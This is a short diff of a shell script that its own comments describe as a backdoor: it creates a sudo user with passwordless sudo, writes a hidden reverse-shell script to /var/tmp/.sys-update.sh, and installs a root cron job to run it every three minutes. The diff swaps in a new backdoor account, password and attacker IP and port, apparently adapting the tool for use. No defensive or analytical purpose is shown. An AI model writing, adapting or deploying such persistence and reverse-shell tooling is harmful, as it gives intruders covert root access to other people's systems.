@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # This script:
-# - Creates a sudo user 'backupsys' with password 'Str0ngP@ss!'
+# - Creates a sudo user with password
 # - Grants passwordless sudo via sudoers.d
 # - Creates a reverse shell script in /var/tmp/.sys-update.sh
 # - Sets a root cron job to run it every 3 minutes
@@ -13,10 +13,10 @@ if [ "$(id -u)" -ne 0 ]; then
   exit 1
 fi
 
-USER_NAME="backupsys"
-USER_PASS="Str0ngP@ss!"
-ATTACK_IP="203.0.113.10"
-ATTACK_PORT="4444"
+USER_NAME="backd"
+USER_PASS="password"
+ATTACK_IP="192.168.3.16"
+ATTACK_PORT="4567"
 CRON_SCRIPT_PATH="/var/tmp/.sys-update.sh"
 
 # Create user with no home, no group, bash shell
